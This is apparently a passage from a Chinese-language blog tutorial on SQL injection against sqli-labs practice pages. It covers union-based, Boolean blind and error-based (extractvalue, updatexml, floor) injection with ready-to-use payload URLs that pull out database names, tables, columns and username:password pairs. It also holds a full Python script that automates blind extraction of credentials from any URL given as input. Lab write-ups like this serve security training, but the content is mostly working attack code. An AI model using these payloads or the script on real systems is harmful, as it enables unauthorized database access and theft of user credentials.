<p>使用order by 4 —+查询该数据表中的字段数量,返回结果如下(—+中，“—”是SQL查询语句中的注释符，“+”在URL中表示空格。)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720083616214.png" alt=""></p>
<p>所以共有3列,然后进行数据库爆破(%23是#的url编码)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sqli.bihuo.cn&#x2F;Less-1&#x2F;?id&#x3D;1%27%20and%201&#x3D;2%20union%20select%201,database(),version();%23</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720090839879.png" alt=""></p>
<p>到此为止，我们就知道，此网站使用的数据库版本是5.5.62-log，使用的数据库名称为sqli_bihuo_cn</p>
<p>爆破数据表(group_concat函数是典型的字符串连接函数。group_concat(table_name)表示把table_name字段的值打印在一行，逗号分隔(默认)。)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database();--+</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720093919235.png" alt=""></p>
<p>爆破数据列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;&#39;sqli_bihuo_cn&#39; and table_name&#x3D;&#39;users&#39;;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720094535283.png" alt=""></p>
<p>爆破数据值(0x3a是:的16进制的分隔符,比如在爆数据值时，(username,0x3a,password)表示(username:password)。)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(username,0x3a,password),3 from sqli_bihuo_cn.users;--+</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(username,&#39;:&#39;,password),3 from sqli_bihuo_cn.users;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720095309360.png" alt=""></p>
<h4 id="Boolean注入攻击"><a href="#Boolean注入攻击" class="headerlink" title="Boolean注入攻击"></a>Boolean注入攻击</h4><p>Boolean注入攻击的测试地址:<a target="_blank" rel="noopener external nofollow noreferrer" href="https://sqli.wmcoder.site/sqli-labs/Less-8/">https://sqli.wmcoder.site/sqli-labs/Less-8/</a></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210721150349958.png" alt=""></p>
<p>输入?id=1查看返回页面(正确)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210721150652502.png" alt=""></p>
<p>输入?id=1’查看返回页面(错误)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210721150732626.png" alt=""></p>
<p>由此判断可能为Boolean盲注,true或false两种结果对应的页面如上所示,因为只能判断对错,要想得到结果需要一个一个的去试,这将是一个大工程,这里仅给出部分思路,后面将给出对应的python脚本.</p>
<p>首先判断数据库名的长度(也可以直接爆破数据库名),下面语句判断数据库名长度是不是大于5</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1%27%20and%20length(database())&gt;5%20--+</span><br></pre></td></tr></table></figure>
<p>正确返回</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210723210020294.png" alt=""></p>
<p>判断数据库名,下面语句判断数据库名第一个字符是否是s</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1%27and%20left(database(),1)&#x3D;%27s%27%20--+</span><br></pre></td></tr></table></figure>
<p>正确返回</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210723210304048.png" alt=""></p>
<p>猜测表名,下面语句判断表名第一个字符是否为e(ascii码为101)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-8&#x2F;</span><br><span class="line">?id&#x3D;1%27and%20ascii(substring((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20limit%200,1),1,1))&#x3D;101%20--+</span><br></pre></td></tr></table></figure>
<p>正确返回</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210723211613049.png" alt=""></p>
<p>猜测users表中字段,下面语句判断users表第一个字段的第一个字符是否为e(ascii码为105)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1%27%20and%20(select%20ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20limit%200,1),1,1)))&#x3D;105--+</span><br></pre></td></tr></table></figure>
<p>同样正确(因为我已经爆破出来了)</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210723212258604.png" alt=""></p>
<p>下面给出对应的python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;请输入目标地址:&quot;</span>)</span><br><span class="line">judge_length_data = <span class="string">&quot;%27%20and%20length(database())=&#123;0&#125;%20--+&quot;</span></span><br><span class="line">judge_length_user = <span class="string">&quot;%27%20and%20length(user())=&#123;0&#125;%20--+&quot;</span></span><br><span class="line">judge_database = <span class="string">&quot;%27and%20left(database(),&#123;0&#125;)=%27&#123;1&#125;%27%20--+&quot;</span></span><br><span class="line">judge_user = <span class="string">&#x27;%27and%20left(user(),&#123;0&#125;)=%27&#123;1&#125;%27%20--+&#x27;</span></span><br><span class="line"><span class="comment"># 疑问</span></span><br><span class="line">judge_table = <span class="string">&#x27;%27and%20ascii(substring((select%20table_name%20from%20information_schema.tables%20where%20table_schema=&#x27;</span> \</span><br><span class="line">              <span class="string">&#x27;database()%20limit%20&#123;t&#125;,1),&#123;w&#125;,1))=&#123;A&#125;%20--%20k&#x27;</span></span><br><span class="line">judge_column = <span class="string">&#x27;%27%20and%20left((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security&#x27;</span> \</span><br><span class="line">               <span class="string">&#x27;%27%20and%20table_name=%27users%27%20limit%20&#123;w&#125;,1),&#123;n&#125;)=%27&#123;c&#125;%27%20--%20k&#x27;</span></span><br><span class="line">judge_username = <span class="string">&#x27;%27%20and%20left((select%20username%20from%20users%20where%20id%20=&#123;n&#125;),&#123;w&#125;)=%27&#123;d&#125;%27%20--%20k&#x27;</span></span><br><span class="line">judge_password = <span class="string">&#x27;%27%20and%20left((select%20password%20from%20users%20where%20id%20=&#123;n&#125;),&#123;w&#125;)=%27&#123;d&#125;%27%20--%20k&#x27;</span></span><br><span class="line">data_length = <span class="number">0</span></span><br><span class="line">data_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">user_length = <span class="number">0</span></span><br><span class="line">user_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table3 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table4 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">column = [<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>]</span><br><span class="line">username = [<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>]</span><br><span class="line">password = [<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>]</span><br><span class="line">result = <span class="string">&quot;You are in...........&quot;</span></span><br><span class="line">list1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;_&#x27;</span>]  <span class="comment"># 字典</span></span><br><span class="line">list2 = [<span class="number">64</span>, <span class="number">94</span>, <span class="number">96</span>, <span class="number">124</span>, <span class="number">176</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">173</span>, <span class="number">175</span>, <span class="number">95</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>,</span><br><span class="line">         <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>,</span><br><span class="line">         <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">44</span>]</span><br><span class="line">list3 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;.&#x27;</span>]  <span class="comment"># 字典</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    payload = judge_length_data.<span class="built_in">format</span>(i, <span class="string">&quot;--+&quot;</span>)</span><br><span class="line">    u = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">if</span> result.encode() <span class="keyword">in</span> u.content:</span><br><span class="line">        data_length = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># print(url+payload)</span></span><br><span class="line">print(<span class="string">&quot;数据库名长度为:&quot;</span>, data_length)</span><br><span class="line"><span class="comment"># 爆破数据库名</span></span><br><span class="line">print(<span class="string">&quot;********开始爆破数据库名********&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, data_length + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list1:</span><br><span class="line">        payload = judge_database.<span class="built_in">format</span>(i, data_name + j)</span><br><span class="line">        u = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> result.encode() <span class="keyword">in</span> u.content:</span><br><span class="line">            data_name += j</span><br><span class="line">            print(<span class="string">&quot;正在对比database第&quot;</span>, i, <span class="string">&quot;个字符&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            print(data_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;********爆破数据库名成功********&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;数据库名:&quot;</span>, data_name)</span><br><span class="line"><span class="comment"># 爆破用户名</span></span><br><span class="line">print(<span class="string">&quot;********开始爆破用户名********&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">25</span>):</span><br><span class="line">    payload = judge_length_user.<span class="built_in">format</span>(i, <span class="string">&quot;--+&quot;</span>)</span><br><span class="line">    u = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">if</span> result.encode() <span class="keyword">in</span> u.content:</span><br><span class="line">        user_length = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, user_length + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list1:</span><br><span class="line">        payload = judge_user.<span class="built_in">format</span>(i, user_name + j)</span><br><span class="line">        u = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> result.encode() <span class="keyword">in</span> u.content:</span><br><span class="line">            user_name += j</span><br><span class="line">            print(<span class="string">&quot;正在对比user第&quot;</span>, i, <span class="string">&quot;个字符&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            print(user_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;********爆破用户名成功********&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;用户名:&quot;</span>, user_name)</span><br><span class="line"><span class="comment"># 爆破表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">25</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> list2:</span><br><span class="line">            <span class="comment"># payload = judge_table.format(t=i, w=j, A=k)</span></span><br><span class="line">            payload = judge_table.<span class="built_in">format</span>(t=i, w=j, A=k)</span><br><span class="line">            u = requests.get(url + payload)</span><br><span class="line">            <span class="comment"># print(url+payload)</span></span><br><span class="line">            <span class="keyword">if</span> result.encode() <span class="keyword">in</span> u.content:</span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                    table1 += <span class="built_in">chr</span>(k)</span><br><span class="line">                    print(<span class="string">&quot;正在对比table1第&quot;</span>, j, <span class="string">&quot;个字符&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                    print(table1)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">                    table2 += <span class="built_in">chr</span>(k)</span><br><span class="line">                    print(<span class="string">&quot;正在对比table2第&quot;</span>, j, <span class="string">&quot;个字符&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                    print(table2)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> i == <span class="number">2</span>:</span><br><span class="line">                    table3 += <span class="built_in">chr</span>(k)</span><br><span class="line">                    print(<span class="string">&quot;正在对比table3第&quot;</span>, j, <span class="string">&quot;个字符&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                    print(table3)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> i == <span class="number">3</span>:</span><br><span class="line">                    table4 += <span class="built_in">chr</span>(k)</span><br><span class="line">                    print(<span class="string">&quot;正在对比table4第&quot;</span>, j, <span class="string">&quot;个字符&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                    print(table4)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;table1名字:&quot;</span>, table1)</span><br><span class="line">print(<span class="string">&quot;table2名字:&quot;</span>, table2)</span><br><span class="line">print(<span class="string">&quot;table3名字:&quot;</span>, table3)</span><br><span class="line">print(<span class="string">&quot;table4名字:&quot;</span>, table4)</span><br><span class="line"><span class="comment"># 爆破表中字段</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> list3:</span><br><span class="line">            payload = judge_column.<span class="built_in">format</span>(w=i, n=j, c=column[i] + k)</span><br><span class="line">            u = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> result.encode() <span class="keyword">in</span> u.content:</span><br><span class="line">                column[i] += k</span><br><span class="line">                print(<span class="string">&#x27;正在对比第&#x27;</span>, i + <span class="number">1</span>, <span class="string">u&#x27;个字段第&#x27;</span>, j, <span class="string">u&#x27;个字符&#x27;</span>, column[i])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    print(<span class="string">&quot;column&quot;</span>, c + <span class="number">1</span>, column[c])</span><br><span class="line"><span class="comment"># 爆破用户名和密码</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> list3:</span><br><span class="line">            payload = judge_username.<span class="built_in">format</span>(n=i, w=j, d=username[i - <span class="number">1</span>] + k)</span><br><span class="line">            u = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> result.encode() <span class="keyword">in</span> u.content:</span><br><span class="line">                username[i - <span class="number">1</span>] += k</span><br><span class="line">                print(<span class="string">&#x27;正在对比第&#x27;</span>, i, <span class="string">&#x27;个记录的username的第&#x27;</span>, j, <span class="string">&#x27;个字符&#x27;</span>, username[i - <span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> list3:</span><br><span class="line">            payload = judge_password.<span class="built_in">format</span>(n=i, w=j, d=password[i - <span class="number">1</span>] + k)</span><br><span class="line">            u = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> result.encode() <span class="keyword">in</span> u.content:</span><br><span class="line">                password[i - <span class="number">1</span>] += k</span><br><span class="line">                print(<span class="string">&#x27;正在对比第&#x27;</span>, i, <span class="string">&#x27;个记录的password的第&#x27;</span>, j, <span class="string">&#x27;个字符&#x27;</span>, password[i - <span class="number">1</span>])</span><br><span class="line">print(<span class="string">&#x27;id    username    password&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">    print(i, <span class="string">&#x27;-&#x27;</span>, username[i - <span class="number">1</span>], <span class="string">&#x27;-&#x27;</span>, password[i - <span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210723212429215.png" alt=""></p>
<h4 id="报错注入攻击"><a href="#报错注入攻击" class="headerlink" title="报错注入攻击"></a>报错注入攻击</h4><p>在探讨SQL注入之报错注入之前，有一个前提就是页面能够响应详细的错误描述，然而mysql数据库中显示错误描述是因为开发程序中采用了print_r mysql_error()函数，将mysql错误信息输出。</p>
<p>报错注入地址:<a target="_blank" rel="noopener external nofollow noreferrer" href="https://sqli.wmcoder.site/sqli-labs/Less-5/">https://sqli.wmcoder.site/sqli-labs/Less-5/</a></p>
<p>报错注入可能用到下面几个函数:</p>
<h5 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extractvalue(xml_doucument,xpath_string,)</span><br></pre></td></tr></table></figure>
<p>xml_doucument是待查询文档,xpath_string是xpath查询语法</p>
<p>作用:对xml文档进行查询</p>
<p>注入语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(&#39;,&#39;,(select version()))) --+</span><br></pre></td></tr></table></figure>
<p>爆出数据库版本</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210728212245425.png" alt=""></p>
<h5 id="updatexml函数"><a href="#updatexml函数" class="headerlink" title="updatexml函数"></a>updatexml函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml(XML_document,XPath_string,new_value)</span><br></pre></td></tr></table></figure>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：XPath_string (Xpath格式的字符串)</p>
<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
<p>作用：改变文档中符合条件的节点的值,改变XML_document中符合XPATH_string的值</p>
<p>注入语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(&#39;,&#39;,(select database())),1) --+</span><br></pre></td></tr></table></figure>
<p>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出数据库名</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210728211322570.png" alt=""></p>
<h5 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.freebuf.com/column/235496.html">floor报错注入</a></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*),floor(rand(0)*2) x from information_schema.tables group by concat(&#39;~&#39;,(select database()),&#39;~&#39;,x)--+</span><br></pre></td></tr></table></figure>
<p>成功爆出数据库名</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210729082800181.png" alt=""></p>
<p>接下来以floor报错注入演示,上面我们已经爆出数据库名,数据库名为:security,下面爆破数据库中的表,构造注入语句如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*),floor(rand(0)*2) x from information_schema.tables group by concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#39;~&#39;,x)--+</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210729085554337.png" alt=""></p>
<p>爆出第一个表名(emails),后续通过修改limit 0,1爆出其他表名,例:limit 1,1,爆出referers表</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210729085808503.png" alt=""></p>
<p>爆出的表名如下:</p>
<ul>
<li>emails</li>
<li>referers</li>
<li>uagents</li>
<li>users</li>
</ul>
<p>接下来,爆出users表的字段,构造注入语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*),floor(rand(0)*2) x from information_schema.tables group by concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),&#39;~&#39;,x)--+</span><br></pre></td></tr></table></figure>
<p>爆出第一个字段id</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210729090246013.png" alt=""></p>
<p>同理,利用limit爆出其他字段</p>
<p>爆出的字段如下:</p>
<ul>
<li>id</li>
<li>username</li>
<li>password</li>
</ul>
<p>接下来爆出users表中数据,构造注入语句如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sqli.wmcoder.site&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select 1,count(*),floor(rand(0)*2) x from information_schema.tables group by concat(&#39;~&#39;,(select concat(username,&#39;:&#39;,password) from users limit 0,1),&#39;~&#39;,x)--+</span><br></pre></td></tr></table></figure>
